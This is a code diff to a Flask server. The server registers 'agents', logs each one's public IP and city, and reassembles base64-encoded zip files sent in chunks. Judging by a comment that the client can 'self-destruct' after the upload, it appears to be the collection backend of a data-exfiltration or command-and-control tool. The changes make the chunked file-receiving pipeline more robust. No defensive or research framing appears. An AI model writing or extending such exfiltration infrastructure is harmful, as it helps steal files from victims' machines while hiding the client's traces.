@@ -1,6 +1,6 @@
-from flask import (Flask, request, jsonify, Response, render_template,
+from flask import (Flask, request, jsonify, render_template,
                    send_file, send_from_directory, redirect, flash, url_for, session)
-import os, zipfile, random, requests, shutil, json
+import os, zipfile, random, requests, shutil, json, base64
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timedelta
 from os.path import getsize
@@ -47,6 +47,7 @@ class Agents(db.Model):
     file_path = db.Column(db.String(500))
     agent_creation = db.Column(db.DateTime)
     file_addition = db.Column(db.DateTime)
+    upload_complete = db.Column(db.Boolean, default=False)
     # geolocation data
     public_ip = db.Column(db.String(120))
     city = db.Column(db.String(120))
@@ -164,8 +165,12 @@ def add_agent():
 
 @app.route('/upload', methods=['POST'])
 def upload_file():
-    file = request.files.get('file')
-    uid = request.form.get('uid')
+    # Extracting the base64 encoded file data and uid from the JSON payload
+    file = request.json.get('file_data')
+    uid = request.json.get('uid')
+
+    # Convert the base64 encoded file data back to bytes:
+    file_bytes = base64.b64decode(file)
 
     agent = Agents.query.filter_by(uid=uid).first()
 
@@ -173,9 +178,9 @@ def upload_file():
         app.logger.error("Invalid or missing UID")
         return jsonify({"error": "Invalid or missing UID"}), 403
 
-    if not file:
-        app.logger.error("No file part in the request")
-        return jsonify({"error": "No file part in the request"}), 400
+    if not file_bytes:
+        app.logger.error("No file data in the request")
+        return jsonify({"error": "No file data in the request"}), 400
 
     metadata = json.loads(agent.file_metadata)
     chunk_ranges = metadata['chunks']
@@ -193,11 +198,24 @@ def upload_file():
 
     unique_filename = f"{uid}.zip"
     filepath = os.path.join(os.getcwd(), "files", unique_filename)
-    with open(filepath, 'ab') as f:
-        f.write(file.read())
-    agent.bytes_received += len(file.read())
+
+    # If this is the first chunk, create the file and update the file_path column:
+    if bytes_received == 0:
+        with open(filepath, 'wb') as f:
+            f.write(file_bytes)
+        agent.file_path = filepath
+
+    else:
+        # If not the first chunk, append to the file:
+        with open(filepath, 'ab') as f:
+            f.write(file_bytes)
+
+    if agent.bytes_received is None:
+        agent.bytes_received = 0
+    agent.bytes_received += len(file_bytes)
     db.session.commit()
 
+    # if the entire file has been uploaded, then extract the zip to a folder, and delete the zip:
     if agent.bytes_received >= metadata['total_size']:
         if is_zip_valid(filepath):
             unzip_dir = os.path.join(os.getcwd(), "files", uid)
@@ -209,6 +227,7 @@ def upload_file():
 
             agent.file_addition = datetime.now().astimezone()
             agent.file_path = unzip_dir
+            agent.upload_complete = True
             db.session.commit()
 
             return jsonify({"message": "File uploaded and extracted successfully."}), 200
@@ -231,18 +250,30 @@ def file_status():
     total_size = metadata['total_size']
     bytes_received = agent.bytes_received or 0
 
-    # If upload is complete
+    # If upload is complete, return completed status so that the client can self-destruct:
     if bytes_received >= total_size:
         return jsonify({"status": "completed", "message": "All chunks uploaded."}), 200
 
-    # Determine the next chunk to send based on bytes_received
+    # Determine the next chunk to send based on bytes_received:
     next_chunk = None
+    next_chunk_range = None
     for chunk, byte_range in metadata['chunks'].items():
         if bytes_received < byte_range[1]:
             next_chunk = chunk
+            next_chunk_range = byte_range
             break
 
-    return jsonify({"status": "incomplete", "next_chunk": next_chunk, "bytes_received": bytes_received}), 200
+    # If there is a next_chunk, return its start and end bytes separately:
+    if next_chunk_range:
+        return jsonify({
+            "status": "incomplete",
+            "next_chunk": next_chunk,
+            "start_byte": next_chunk_range[0],
+            "end_byte": next_chunk_range[1],
+            "bytes_received": bytes_received
+        }), 200
+    else:
+        return jsonify({"status": "incomplete", "next_chunk": next_chunk, "bytes_received": bytes_received}), 200
 
 
 @app.route('/speedtest', methods=['POST'])
